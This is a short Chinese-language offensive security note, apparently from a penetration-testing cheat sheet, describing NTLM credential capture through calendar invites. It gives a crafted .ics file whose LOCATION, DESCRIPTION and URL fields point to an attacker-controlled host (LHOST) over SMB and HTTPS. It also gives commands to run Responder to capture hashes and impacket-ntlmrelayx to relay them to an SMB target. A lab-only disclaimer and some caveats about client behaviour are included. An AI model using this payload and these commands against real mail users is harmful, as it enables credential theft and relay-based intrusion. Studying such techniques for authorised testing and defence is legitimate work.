# 日历邀请

::: warning 仅供学习 / 授权实验
ICS 里的 UNC 只指向你自己的实验监听。收到邀请 ≠ 会认证。
:::

`.ics` 字段 `LOCATION` / `DESCRIPTION` / `URL` / `ATTACH` 可能让客户端访问外部资源。

```text
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//lab//EN
BEGIN:VEVENT
UID:lab-001@corp.example
DTSTAMP:20260101T090000Z
DTSTART:20260102T090000Z
DTEND:20260102T100000Z
SUMMARY:Status meeting
LOCATION:\\\\LHOST\\lab
DESCRIPTION:Agenda: https://LHOST/probe
URL:https://LHOST/probe
END:VEVENT
END:VCALENDAR
```

同一份邀请放 SMB + HTTPS 探针。日志没有请求就不要假设「客户端会认证」。

```bash
sudo responder -I eth0
# 或中继（签名未强制）
impacket-ntlmrelayx -t smb://TARGET -smb2support
```

非 Windows 客户端通常没有 NTLM。Outlook 常默认阻止自动下载外部内容。
